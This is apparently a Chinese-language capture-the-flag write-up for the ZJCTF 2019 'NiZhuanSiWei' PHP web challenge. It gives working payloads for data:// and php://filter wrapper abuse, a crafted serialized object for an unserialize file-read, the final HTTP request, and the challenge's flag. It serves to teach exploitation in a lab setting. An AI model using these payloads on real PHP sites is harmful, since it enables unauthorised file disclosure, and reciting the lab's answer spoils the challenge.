---
title: ZJCTF 2019 NiZhuanSiWei
date: 2023-10-24
categories:
  - CTF
  - Web
---

## 前置工作

打开靶机网页，可见如下 PHP 代码

```php
<?php  
$text = $_GET["text"];
$file = $_GET["file"];
$password = $_GET["password"];
if(isset($text)&&(file_get_contents($text,'r')==="welcome to the zjctf")){
    echo "<br><h1>".file_get_contents($text,'r')."</h1></br>";
    if(preg_match("/flag/",$file)){
        echo "Not now!";
        exit(); 
    }else{
        include($file);  //useless.php
        $password = unserialize($password);
        echo $password;
    }
}
else{
    highlight_file(__FILE__);
}
?>
```

## 伪协议构造 $text

我们阅读一下，如果 `$text` 存在且 `file_get_contents($text, 'r')` 等于 `welcome to the zjctf` 时，才有后面发生的事情，所以我们需要让 `$text` 为一个文件，而这个文件的内容就是 `welcome to the zjctf`，所以可以运用到 PHP 伪协议之一 `data://`，我们可以这么为造出一个文件来

```
?text = data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=
```

显而易见，后面那一串 Base64 解码后就是 `welcome to the zjctf`，我们发送请求，屏幕上出现了一个大大的 **welcome to the zjctf**，这一步成功

## 伪协议构造 $file

从代码中我们可以看见程序已经把 `flag` 这个字符直接屏蔽掉了，但我们的目标暂时不是 `flag`，而是下面说的一个 `useless.php`，这就有点此地无银三百两的感觉了，他要 `include($file)`，还指示我要跟 `useless.php` 搭上关系，那么我们就应当让 `$file = useless.php`

但真的是这样吗？

下面的代码没有对 `include()` 进来的东西产生任何处理，说明就算 `include()` 进来我也不知道发生了什么，那么我希望我能使用 PHP 伪协议把这个文件直接读出来，所以可以这么写

```
?file = php://filter/read=convert.base64-encode/resource=useless.php
```

发送请求后，我们可以看到下面多了一串 Base64 编码

```
PD9waHAgIAoKY2xhc3MgRmxhZ3sgIC8vZmxhZy5waHAgIAogICAgcHVibGljICRmaWxlOyAgCiAgICBwdWJsaWMgZnVuY3Rpb24gX190b3N0cmluZygpeyAgCiAgICAgICAgaWYoaXNzZXQoJHRoaXMtPmZpbGUpKXsgIAogICAgICAgICAgICBlY2hvIGZpbGVfZ2V0X2NvbnRlbnRzKCR0aGlzLT5maWxlKTsgCiAgICAgICAgICAgIGVjaG8gIjxicj4iOwogICAgICAgIHJldHVybiAoIlUgUiBTTyBDTE9TRSAhLy8vQ09NRSBPTiBQTFoiKTsKICAgICAgICB9ICAKICAgIH0gIAp9ICAKPz4gIAo
```

我们对他解码，得到 `useless.php`

```php
<?php
class Flag{  //flag.php  
    public $file;  
    public function __tostring(){  
        if(isset($this->file)){  
            echo file_get_contents($this->file); 
            echo "<br>";
        return ("U R SO CLOSE !///COME ON PLZ");
        }  
    }  
}  
?>  
```

## 构造 Flag 对象

发现这根本不 useless，反而 useful，因为这是一个对象，这样子就跟下面的代码联系上了，在 `include()` 下面我们还有一个 `$password = unserialize($password);` 的语句，其中 `unserialize()` 即反序列化，与其对应的还有 `serialize()` 即序列化，分别是将**字符串转为对象**和将**对象转为字符串**

那么如果我们构造一个 Flag 对象，让他的（Flag 对象的，不是大题目里的）内部属性 `$file` = `flag.php`（至于这个 `flag.php` 怎么来的，可以看 `useless.php` 的第一行注释），那么就可以实现最终 `echo $password` 的时候打印的实际上是 `flag.php` 中的内容，所以我们可以写这么一段代码，放到 PHP Playground 里去跑一跑

```php
<?php
class Flag{  //flag.php  
    public $file;  
    public function __tostring(){  
        if(isset($this->file)){  
            echo file_get_contents($this->file); 
            echo "<br>";
        return ("U R SO CLOSE !///COME ON PLZ");
        }  
    }  
}

$flag = new Flag(); // 创建一个 Flag 对象
$flag -> file = "flag.php"; // 将 Flag 对象的 file 属性设置为 flag.php
echo serialize($flag); // 将 Flag 对象序列化后打印输出
?> 
```

由此一来我们得到了一串被序列化后的 Flag 对象

```
O:4:"Flag":1:{s:4:"file";s:8:"flag.php";}
```

那么很显然，我们的 `$password` 也理应等于这个被序列化后的 Flag 对象，最终我们的 Http 请求代码是（别忘了现在需要把 `$file` 改为 `useless.php`，因为你不需要再看他的源码了）

```http
GET /?text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=&file=useless.php&password=O:4:%22Flag%22:1:%7Bs:4:%22file%22;s:8:%22flag.php%22;%7D HTTP/1.1
Host: 93865280-0782-49eb-80c2-893e57e7e0e1.node4.buuoj.cn:81
User-Agent: Apifox/1.0.0 (https://apifox.com)
Accept: */*
Host: 93865280-0782-49eb-80c2-893e57e7e0e1.node4.buuoj.cn:81
Connection: keep-alive
```

最终在源代码中可以找到 Flag，是 `flag{6063798f-c16b-490b-afcd-19edd1ccc5df}`